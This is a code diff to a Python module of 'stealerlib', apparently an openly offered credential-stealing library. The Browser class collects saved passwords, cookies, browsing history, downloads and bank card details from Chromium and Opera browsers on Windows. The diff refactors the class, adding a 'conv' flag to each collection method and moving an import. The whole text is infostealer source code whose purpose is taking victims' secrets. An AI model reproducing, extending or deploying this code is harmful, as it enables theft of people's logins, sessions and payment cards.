@@ -19,10 +19,10 @@ from datetime import datetime, timedelta
 from win32crypt import CryptUnprotectData
 
 from stealerlib.exceptions import catch
-from stealerlib.datatypes import BrowserTypes
 
 from stealerlib.browser.opera import Opera
 from stealerlib.browser.chromium import Chromium
+from stealerlib.browser.types import BrowserTypes
 
 
 class Browser(Chromium, Opera):
@@ -32,7 +32,7 @@ class Browser(Chromium, Opera):
         Chromium.__init__(self)
 
 
-    def get_passwords(self, type="all") -> Union[list[tuple], list[list]]:
+    def get_passwords(self, type="all", conv: bool=True) -> Union[list[tuple], list[list]]:
         """Gets the saved userames and passwords for the specific browser type
 
         Parameters:
@@ -40,7 +40,7 @@ class Browser(Chromium, Opera):
             type (str): Browser type to collect passwords from (default=all)
 
         Returns:
-            list[list[str, ...]]: list of (site_url, username, password) lists (derived from DataTypes conv()) 
+            list[list[str, ...]]: list of (site_url, username, password) lists (derived from BrowserTypes conv()) 
 
         Example:
             browser = Browser()
@@ -48,18 +48,18 @@ class Browser(Chromium, Opera):
         """
 
         if type == "chromium":
-            passwords = self.cget(self._chromium_passwords)
+            passwords = self.cget(self._chromium_passwords, conv=conv)
         elif type == "opera":
-            passwords = self.oget(self._opera_passwords)
+            passwords = self.oget(self._opera_passwords, conv=conv)
         else:
             passwords = [
-                self.cget(self._chromium_passwords),
-                self.oget(self._opera_passwords)
+                self.cget(self._chromium_passwords, conv=conv),
+                self.oget(self._opera_passwords, conv=conv)
             ]
 
         return passwords
 
-    def get_cookies(self, type="all") -> Union[list[list], list[list]]:
+    def get_cookies(self, type="all", conv: bool=True) -> Union[list[list], list[list]]:
         """Gets the saved cookies for the specific browser type
 
         Parameters:
@@ -67,7 +67,7 @@ class Browser(Chromium, Opera):
             type (str): Browser type to collect cookies from (default=all)
 
         Returns:
-            list[list[str, ...]]: list of (host, expires?, expire_date, path, name, value) lists (derived from DataTypes conv()) 
+            list[list[str, ...]]: list of (host, expires?, expire_date, path, name, value) lists (derived from BrowserTypes conv()) 
 
         Example:
             browser = Browser()
@@ -75,18 +75,18 @@ class Browser(Chromium, Opera):
         """
 
         if type == "chromium":
-            cookies = self.cget(self._chromium_cookies)
+            cookies = self.cget(self._chromium_cookies, conv=conv)
         elif type == "opera":
-            cookies = self.oget(self._opera_cookies)
+            cookies = self.oget(self._opera_cookies, conv=conv)
         else:
             cookies = [
-                self.cget(self._chromium_cookies),
-                self.oget(self._opera_cookies)
+                self.cget(self._chromium_cookies, conv=conv),
+                self.oget(self._opera_cookies, conv=conv)
             ]
 
         return cookies
 
-    def get_history(self, type="all") -> Union[list[list], list[list]]:
+    def get_history(self, type="all", conv: bool=True) -> Union[list[list], list[list]]:
         """Gets the saved browser history for the specific browser type
 
         Parameters:
@@ -94,7 +94,7 @@ class Browser(Chromium, Opera):
             type (str): Browser type to collect web history from (default=all)
 
         Returns:
-            list[list[str, ...]]: list of (site_url, title, timestamp) lists (derived from DataTypes conv()) 
+            list[list[str, ...]]: list of (site_url, title, timestamp) lists (derived from BrowserTypes conv()) 
 
         Example:
             browser = Browser()
@@ -102,18 +102,18 @@ class Browser(Chromium, Opera):
         """
 
         if type == "chromium":
-            history = self.cget(self._chromium_history)
+            history = self.cget(self._chromium_history, conv=conv)
         elif type == "opera":
-            history = self.oget(self._opera_history)
+            history = self.oget(self._opera_history, conv=conv)
         else:
             history = [
-                self.cget(self._chromium_history),
-                self.oget(self._opera_history)
+                self.cget(self._chromium_history, conv=conv),
+                self.oget(self._opera_history, conv=conv)
             ]
 
         return history
 
-    def get_downloads(self, type="all") -> Union[list[list], list[list]]:
+    def get_downloads(self, type="all", conv: bool=True) -> Union[list[list], list[list]]:
         """Gets the saved browser downloads for the specific browser type
 
         Parameters:
@@ -121,7 +121,7 @@ class Browser(Chromium, Opera):
             type (str): Browser type to collect download history from (default=all)
 
         Returns:
-            list[list[str, ...]]: list of (tab_url, local_path) lists (derived from DataTypes conv()) 
+            list[list[str, ...]]: list of (tab_url, local_path) lists (derived from BrowserTypes conv()) 
 
         Example:
             browser = Browser()
@@ -129,18 +129,18 @@ class Browser(Chromium, Opera):
         """
 
         if type == "chromium":
-            downloads = self.cget(self._chromium_downloads)
+            downloads = self.cget(self._chromium_downloads, conv=conv)
         elif type == "opera":
-            downloads = self.oget(self._opera_downloads)
+            downloads = self.oget(self._opera_downloads, conv=conv)
         else:
             downloads = [
-                self.cget(self._chromium_downloads),
-                self.oget(self._opera_downloads)
+                self.cget(self._chromium_downloads, conv=conv),
+                self.oget(self._opera_downloads, conv=conv)
             ]
 
         return downloads
 
-    def get_cards(self, type="all") -> Union[list[list], list[list]]:
+    def get_cards(self, type="all", conv: bool=True) -> Union[list[list], list[list]]:
         """Gets the saved browser bank cards for the specific browser type
 
         Parameters:
@@ -148,7 +148,7 @@ class Browser(Chromium, Opera):
             type (str): Browser type to collect bank cards from (default=all)
 
         Returns:
-            list[list[str, ...]]: list of (name, month, year, number, date_modified) lists (derived from DataTypes conv()) 
+            list[list[str, ...]]: list of (name, month, year, number, date_modified) lists (derived from BrowserTypes conv()) 
 
         Example:
             browser = Browser()
@@ -156,13 +156,13 @@ class Browser(Chromium, Opera):
         """
 
         if type == "chromium":
-            cards = self.cget(self._chromium_credit_cards)
+            cards = self.cget(self._chromium_credit_cards, conv=conv)
         elif type == "opera":
-            cards = self.oget(self._opera_credit_cards)
+            cards = self.oget(self._opera_credit_cards, conv=conv)
         else:
             cards = [
-                self.cget(self._chromium_credit_cards),
-                self.oget(self._opera_credit_cards)
+                self.cget(self._chromium_credit_cards, conv=conv),
+                self.oget(self._opera_credit_cards, conv=conv)
             ]
 
         return cards
